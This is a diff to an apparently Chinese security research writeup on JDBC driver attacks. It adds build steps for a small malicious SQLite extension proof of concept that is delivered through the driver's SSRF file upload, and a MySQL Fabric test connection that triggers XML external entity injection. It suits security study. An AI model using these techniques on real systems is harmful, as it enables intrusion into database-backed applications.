@@ -129,13 +129,13 @@ public void modeshape() throws SQLException {
 议题原分享者，只是假设有一个可控的 SQLite Extension 文件的话可以利用。
 但实际上仅通过 SQLite Driver 就足够达到这一点了，因为它内部的 SSRF 本事就是一个文件上传的功能，只不过有大小限制。
 
-目前只在 Ubuntu 测试过，编译 `poc.c` 文件
+目前只在 Ubuntu 测试过，编译 `poc.c` 文件，
 
 ```sh
 gcc -Os -flto -fdata-sections -ffunction-sections -c poc.c
 ```
 
-通过 `poc.lds` 链接脚本，编译 Extension
+通过 `poc.lds` 链接脚本，编译 Extension（保证体积不超过 8K），
 
 ```sh
 gcc -T poc.lds -fPIC -s -nostartfiles -nostdlib -flto -shared poc.o -o pocs.so
@@ -199,4 +199,12 @@ public void sqlite() throws SQLException, MalformedURLException {
 
 ### MySQL Fabric
 
-...
+利用 XMLRPC，实现 XML 外部实体注入。
+
+```java
+@Test
+public void fabric() throws SQLException {
+	String url = "jdbc:mysql:fabric://127.0.0.1:5000";
+	Connection conn = DriverManager.getConnection(url);
+}
+```
